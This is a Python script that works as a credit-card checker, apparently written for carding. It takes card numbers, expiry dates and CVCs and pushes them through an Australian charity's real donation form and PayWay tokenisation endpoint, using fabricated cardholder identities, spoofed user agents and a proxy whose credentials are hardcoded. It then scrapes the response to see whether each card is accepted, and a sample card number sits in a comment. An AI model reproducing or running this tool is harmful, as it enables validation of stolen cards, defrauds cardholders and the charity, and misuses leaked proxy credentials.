import random
import string
import requests
from user_agent import generate_user_agent
from proxy import reqproxy, make_request
import json
import re
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from urllib.parse import urlparse, urlencode, parse_qs

#============================================
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["London", "Birmingham", "Manchester", "Liverpool", "Leeds", "Glasgow", "Sheffield", "Edinburgh", "Bristol", "Cardiff"]
    states = ["England", "England", "England", "England", "England", "Scotland", "England", "Scotland", "England", "Wales"]
    streets = ["Baker St", "Oxford St", "High St", "King's Rd", "Abbey Rd", "The Strand", "Regent St", "Whitehall", "Fleet St", "Pall Mall"]
    zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG", "EC1A 1BB", "SE1 8XX", "B1 1AA", "RG1 8DN", "SW1E 5RS", "B2 5DT"]
    
    city = random.choice(cities)
    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
    zip_code = random.choice(zip_codes)
    return street_address, city, "GB", zip_code, f"07{random.randint(100000000, 999999999)}"

def generate_email():
    return f"user{random.randint(10000,99999)}@example.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def generate_random_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

#============================================
def Tele(ccx):
    proxy_str = "brd.superproxy.io:33335:brd-customer-hl_814755ba-zone-datacenter_proxy1:quvlkui5tk88"
    session, ip = reqproxy(proxy_str)
    #print(f"IP Address: {ip}")
    ccx = ccx.strip()
    numbers = re.findall(r"\d+", ccx)
    n = mm = yy = cvc = ""
    if len(numbers) >= 4:
        n = numbers[0]
        mm = numbers[1]
        yy = numbers[2]
        cvc = numbers[3]
        #mm = str(int(mm))
        if len(yy) == 4:
            yy = yy[-2:]

    user = generate_user_agent()
    r = requests.Session()
    r.verify = False
    
    first_name, last_name = generate_full_name()
    kaddress, city, country, postcode, phone =     generate_address()
    kaddress, city, country, postcode, phone = generate_address()
    email = generate_email()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()
    nr = random.randint(100000, 999999)
    lr = random.randint(1000, 9999)
    fr = random.randint(11, 99)
    br = random.randint(1, 4)
    username = ''.join(random.choices(string.ascii_lowercase, k=8))
    
    headers = {
        'user-agent': user,
    }
    
    response = session.get('https://tsanz.com.au/donations/donationform.htm',
    headers=headers,
    timeout=30,
    )
    
    token = re.search(r'name="_token" value="(.*?)"', response.text).group(1)
    print(token)
    
    headers = {
        'authorization': 'Basic UTE0MTUyX1BVQl9qcTlneHZ5NGo1NzRodmQ3aDlzYXhqbXd5eHkzdGN3bnZlNXIyMnhleDdlazYzM2Z2N3AzeG1uenMyMmY6',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'user-agent': user,
    }
    
    data = {
        'paymentMethod': 'creditCard',
        'connectionType': 'FRAME',
        'cardNumber': f'{n}',
        'cvn': f'{cvc}',
        'cardholderName': f'{first_name} {last_name}',
        'expiryDateMonth': f'{mm}',
        'expiryDateYear': f'{yy}',
        'threeDS2': 'false',
    }
    
    response = requests.post('https://api.payway.com.au/rest/v1/single-use-tokens', headers=headers, 
    data=data,
    timeout=30,
    )
    id = response.json()['singleUseTokenId']
    print(id)
    
    headers = {
        'referer': 'https://tsanz.com.au/donations/donationform.htm',
        'user-agent': user,
    }
    
    files = [
        ('_token', (None, f'{token}')),
        ('email', (None, f'rodamuser{nr}@gmail.com')),
        ('title', (None, '')),
        ('first_name', (None, f'{first_name}')),
        ('last_name', (None, f'{last_name}')),
        ('phone', (None, f'430300{lr}')),
        ('address1', (None, '27 Allen St')),
        ('address2', (None, '')),
        ('suburb', (None, 'New York')),
        ('postcode', (None, '10080')),
        ('country_id', (None, '167')),
        ('state_id', (None, '93')),
        ('company', (None, '')),
        ('donation_amount', (None, 'other')),
        ('other_donation', (None, f'{fr}.{br}')),
        ('_token', (None, f'{token}')),
        ('singleUseTokenId', (None, f'{id}')),
    ]
    
    response = session.post('https://tsanz.com.au/my-account/donation',
    headers=headers,
    files=files,
    timeout=30,
    )
    
    try:
        result = re.search(r'<div class="toast-body">\s*(.*?)\s*<\/div>', response.text).group(1)
    except:
        result = "Error While Processing.."
    return result
    
#test_card = "5311024271771951|09|2034|218"
#print(Tele(test_card))
